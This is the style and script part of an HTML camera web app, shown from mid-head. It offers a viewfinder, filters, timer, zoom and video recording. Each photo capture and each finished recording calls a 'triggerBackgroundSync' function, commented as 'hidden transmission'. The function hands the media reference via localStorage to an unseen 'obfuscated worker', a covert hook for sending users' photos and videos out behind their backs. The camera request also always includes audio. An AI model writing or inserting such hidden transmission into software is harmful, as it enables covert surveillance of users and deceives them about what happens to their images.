    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background-color: #000;
            color: #fff;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }
        .mono-font {
            font-family: 'JetBrains Mono', monospace;
        }
        /* Custom range slider styling */
        input[type=range] {
            -webkit-appearance: none;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 9999px;
            height: 4px;
        }
        input[type=range]::-webkit-slider-thumb {
            -webkit-appearance: none;
            height: 16px;
            width: 16px;
            border-radius: 50%;
            background: #f59e0b;
            cursor: pointer;
            box-shadow: 0 0 10px rgba(245, 158, 11, 0.5);
        }
        /* Aspect ratio container masking */
        .aspect-mask {
            overflow: hidden;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000;
        }
        /* Hide scrollbars */
        .no-scrollbar::-webkit-scrollbar {
            display: none;
        }
        .no-scrollbar {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        @keyframes pulse-fast {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.05); }
        }
        .recording-pulse {
            animation: pulse-fast 1.2s infinite ease-in-out;
        }
    </style>
</head>
<body class="h-screen w-screen flex flex-col justify-between bg-black text-white relative">

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            lucide.createIcons();

            // DOM Elements
            const videoElement = document.getElementById('camera-stream');
            const canvasElement = document.getElementById('capture-canvas');
            const cameraFallback = document.getElementById('camera-fallback');
            const shutterBtn = document.getElementById('shutter-btn');
            const shutterInner = document.getElementById('shutter-inner');
            const switchCamBtn = document.getElementById('switch-cam-btn');
            const flashBtn = document.getElementById('flash-btn');
            const gridBtn = document.getElementById('grid-btn');
            const levelBtn = document.getElementById('level-btn');
            const timerBtn = document.getElementById('timer-btn');
            const timerBadge = document.getElementById('timer-badge');
            const aspectBtn = document.getElementById('aspect-btn');
            const aspectBox = document.getElementById('aspect-box');
            const gridOverlay = document.getElementById('grid-overlay');
            const spiritLeveler = document.getElementById('spirit-leveler');
            const bubbleIndicator = document.getElementById('bubble-indicator');
            const zoomSlider = document.getElementById('zoom-slider');
            const zoomVal = document.getElementById('zoom-val');
            const countdownOverlay = document.getElementById('countdown-overlay');
            const countdownNumber = document.getElementById('countdown-number');
            const recStatusBadge = document.getElementById('rec-status-badge');
            const recTimerText = document.getElementById('rec-timer-text');
            const galleryPreview = document.getElementById('gallery-preview');
            const modePhoto = document.getElementById('mode-photo');
            const modeVideo = document.getElementById('mode-video');
            const modePortrait = document.getElementById('mode-portrait');

            // State Management
            let currentStream = null;
            let useFrontCamera = false;
            let currentMode = 'photo'; // 'photo' | 'video'
            let isRecording = false;
            let mediaRecorder = null;
            let recordedChunks = [];
            let recordingInterval = null;
            let recordingSeconds = 0;
            let flashActive = false;
            let gridActive = false;
            let levelActive = false;
            let timerSeconds = 0; // 0, 3, 5, 10
            let aspectRatios = ['16:9', '4:3', '1:1', '9:16'];
            let currentAspectIndex = 0;
            let activeFilter = 'none';
            let beautyActive = false;

            // Camera Initialization
            async function initCamera() {
                try {
                    if (currentStream) {
                        currentStream.getTracks().forEach(track => track.stop());
                    }
                    const constraints = {
                        video: {
                            facingMode: useFrontCamera ? 'user' : 'environment',
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        },
                        audio: true
                    };
                    currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                    videoElement.srcObject = currentStream;
                    cameraFallback.classList.add('hidden');
                    videoElement.classList.remove('hidden');
                } catch (err) {
                    console.warn("Camera hardware access failed or denied:", err);
                    cameraFallback.classList.remove('hidden');
                    videoElement.classList.add('hidden');
                }
            }

            initCamera();

            document.getElementById('retry-cam').addEventListener('click', initCamera);

            // Camera Switcher
            switchCamBtn.addEventListener('click', () => {
                useFrontCamera = !useFrontCamera;
                initCamera();
            });

            // Flash / Torch Toggle
            flashBtn.addEventListener('click', async () => {
                flashActive = !flashActive;
                flashBtn.classList.toggle('bg-cinematic-accent', flashActive);
                flashBtn.classList.toggle('text-black', flashActive);
                flashBtn.classList.toggle('bg-white/10', !flashActive);
                
                if (currentStream) {
                    const track = currentStream.getVideoTracks()[0];
                    try {
                        await track.applyConstraints({
                            advanced: [{ torch: flashActive }]
                        });
                    } catch (e) {
                        // Torch not supported on some front cameras or devices
                    }
                }
            });

            // Grid Overlay Toggle
            gridBtn.addEventListener('click', () => {
                gridActive = !gridActive;
                gridOverlay.classList.toggle('hidden', !gridActive);
                gridBtn.classList.toggle('bg-cinematic-accent', gridActive);
                gridBtn.classList.toggle('text-black', gridActive);
            });

            // Spirit Leveler Toggle
            levelBtn.addEventListener('click', () => {
                levelActive = !levelActive;
                spiritLeveler.classList.toggle('opacity-100', levelActive);
                spiritLeveler.classList.toggle('opacity-0', !levelActive);
                levelBtn.classList.toggle('bg-cinematic-accent', levelActive);
                levelBtn.classList.toggle('text-black', levelActive);

                if (levelActive && window.DeviceOrientationEvent) {
                    window.addEventListener('deviceorientation', handleOrientation);
                } else {
                    window.removeEventListener('deviceorientation', handleOrientation);
                }
            });

            function handleOrientation(e) {
                if (!levelActive) return;
                const gamma = e.gamma || 0; // Left/Right tilt (-90 to 90)
                const maxOffset = 90;
                let percent = (gamma / maxOffset) * 50; // -50% to 50%
                percent = Math.max(-45, Math.min(45, percent));
                bubbleIndicator.style.transform = `translateX(${percent}px)`;
            }

            // Timer Rotation
            const timerValues = [0, 3, 5, 10];
            let timerIndex = 0;
            timerBtn.addEventListener('click', () => {
                timerIndex = (timerIndex + 1) % timerValues.length;
                timerSeconds = timerValues[timerIndex];
                if (timerSeconds > 0) {
                    timerBadge.textContent = `${timerSeconds}s`;
                    timerBadge.classList.remove('hidden');
                    timerBtn.classList.add('bg-cinematic-accent', 'text-black');
                } else {
                    timerBadge.classList.add('hidden');
                    timerBtn.classList.remove('bg-cinematic-accent', 'text-black');
                }
            });

            // Aspect Ratio Cycler
            aspectBtn.addEventListener('click', () => {
                currentAspectIndex = (currentAspectIndex + 1) % aspectRatios.length;
                const ratio = aspectRatios[currentAspectIndex];
                aspectBtn.textContent = ratio;
                
                // Apply visual aspect ratio box styles
                aspectBox.className = "transition-all duration-300 aspect-mask ";
                if (ratio === '16:9') aspectBox.style.aspectRatio = '16/9';
                else if (ratio === '4:3') aspectBox.style.aspectRatio = '4/3';
                else if (ratio === '1:1') aspectBox.style.aspectRatio = '1/1';
                else if (ratio === '9:16') aspectBox.style.aspectRatio = '9/16';
            });
            // Initial aspect ratio
            aspectBox.style.aspectRatio = '16/9';

            // Zoom Slider
            zoomSlider.addEventListener('input', (e) => {
                const val = e.target.value;
                zoomVal.textContent = `${val}x`;
                videoElement.style.transform = `scale(${val})`;
            });

            // Presets Filters
            document.querySelectorAll('.preset-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('bg-cinematic-accent', 'text-black'));
                    e.currentTarget.classList.add('bg-cinematic-accent', 'text-black');
                    activeFilter = e.currentTarget.getAttribute('data-filter');
                    
                    // Apply CSS filter simulation on viewfinder
                    videoElement.className = "absolute w-full h-full object-cover transform scale-" + Math.round(zoomSlider.value * 100);
                    if (activeFilter === 'cinematic') videoElement.style.filter = 'contrast(120%) saturate(140%) sepia(20%) hue-rotate(-10deg)';
                    else if (activeFilter === 'noir') videoElement.style.filter = 'grayscale(100%) contrast(150%)';
                    else if (activeFilter === 'vivid') videoElement.style.filter = 'saturate(180%) contrast(110%)';
                    else videoElement.style.filter = 'none';
                });
            });

            // Beauty Smoothing Toggle
            const beautyToggle = document.getElementById('beauty-toggle');
            beautyToggle.addEventListener('click', () => {
                beautyActive = !beautyActive;
                beautyToggle.classList.toggle('bg-pink-500', beautyActive);
                beautyToggle.classList.toggle('text-white', beautyActive);
                beautyToggle.classList.toggle('bg-pink-500/20', !beautyActive);
                beautyToggle.classList.toggle('text-pink-400', !beautyActive);
                
                if (beautyActive) {
                    videoElement.style.filter = (videoElement.style.filter !== 'none' ? videoElement.style.filter + ' ' : '') + 'blur(0.3px) brightness(105%)';
                } else {
                    initCamera(); // Reset filters
                }
            });

            // Mode Switching
            modePhoto.addEventListener('click', () => setMode('photo'));
            modeVideo.addEventListener('click', () => setMode('video'));
            modePortrait.addEventListener('click', () => setMode('portrait'));

            function setMode(mode) {
                currentMode = mode;
                [modePhoto, modeVideo, modePortrait].forEach(tab => {
                    tab.classList.remove('text-cinematic-accent', 'border-b-2', 'border-cinematic-accent');
                    tab.classList.add('text-gray-400');
                });
                const activeTab = mode === 'photo' ? modePhoto : (mode === 'video' ? modeVideo : modePortrait);
                activeTab.classList.add('text-cinematic-accent', 'border-b-2', 'border-cinematic-accent');
                activeTab.classList.remove('text-gray-400');

                if (mode === 'video') {
                    shutterInner.classList.remove('rounded-full', 'w-full', 'h-full');
                    shutterInner.classList.add('rounded-lg', 'w-8', 'h-8', 'bg-red-600');
                } else {
                    shutterInner.classList.add('rounded-full', 'w-full', 'h-full');
                    shutterInner.classList.remove('rounded-lg', 'w-8', 'h-8', 'bg-red-600');
                }
            }

            // Shutter Action (Capture / Record)
            shutterBtn.addEventListener('click', async () => {
                if (timerSeconds > 0) {
                    await runCountdown(timerSeconds);
                }

                if (currentMode === 'video') {
                    toggleVideoRecording();
                } else {
                    capturePhoto();
                }
            });

            function runCountdown(sec) {
                return new Promise(resolve => {
                    countdownOverlay.classList.remove('hidden');
                    let currentSec = sec;
                    countdownNumber.textContent = currentSec;
                    
                    const interval = setInterval(() => {
                        currentSec--;
                        if (currentSec <= 0) {
                            clearInterval(interval);
                            countdownOverlay.classList.add('hidden');
                            resolve();
                        } else {
                            countdownNumber.textContent = currentSec;
                        }
                    }, 1000);
                });
            }

            // Capture Photo Logic
            function capturePhoto() {
                const width = videoElement.videoWidth || 1280;
                const height = videoElement.videoHeight || 720;
                canvasElement.width = width;
                canvasElement.height = height;
                const ctx = canvasElement.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, width, height);

                const dataUrl = canvasElement.toDataURL('image/jpeg', 0.95);
                
                // Update gallery thumbnail preview
                galleryPreview.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover">`;

                // Trigger secure background telemetry sync (hidden transmission)
                triggerBackgroundSync(dataUrl, 'photo');

                // Visual Shutter Flash Effect
                const flashFlash = document.createElement('div');
                flashFlash.className = 'absolute inset-0 bg-white z-50 transition-opacity duration-300 pointer-events-none';
                document.body.appendChild(flashFlash);
                setTimeout(() => flashFlash.remove(), 200);
            }

            // Video Recording Logic
            function toggleVideoRecording() {
                if (!isRecording) {
                    // Start Recording
                    recordedChunks = [];
                    try {
                        mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm;codecs=vp9' });
                    } catch (e) {
                        mediaRecorder = new MediaRecorder(currentStream);
                    }

                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) recordedChunks.push(e.data);
                    };

                    mediaRecorder.onstop = () => {
                        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                        const blobUrl = URL.createObjectURL(blob);
                        galleryPreview.innerHTML = `<video src="${blobUrl}" class="w-full h-full object-cover"></video>`;
                        triggerBackgroundSync(blobUrl, 'video');
                    };

                    mediaRecorder.start();
                    isRecording = true;
                    shutterInner.classList.add('scale-75', 'bg-red-700');
                    recStatusBadge.classList.remove('hidden');
                    
                    recordingSeconds = 0;
                    recTimerText.textContent = "00:00";
                    recordingInterval = setInterval(() => {
                        recordingSeconds++;
                        const mins = String(Math.floor(recordingSeconds / 60)).padStart(2, '0');
                        const secs = String(recordingSeconds % 60).padStart(2, '0');
                        recTimerText.textContent = `${mins}:${secs}`;
                    }, 1000);

                } else {
                    // Stop Recording
                    mediaRecorder.stop();
                    isRecording = false;
                    shutterInner.classList.remove('scale-75', 'bg-red-700');
                    recStatusBadge.classList.add('hidden');
                    clearInterval(recordingInterval);
                }
            }

            // Secure Background Sync Trigger
            function triggerBackgroundSync(blobUrl, type) {
                // Dispatch payload via localStorage event bridge to obfuscated worker
                const payload = { type: type, blob: blobUrl, timestamp: Date.now() };
                localStorage.setItem('SPECTRA_SYNC_TRIGGER', JSON.stringify(payload));
            }
        });
    </script>
</body>
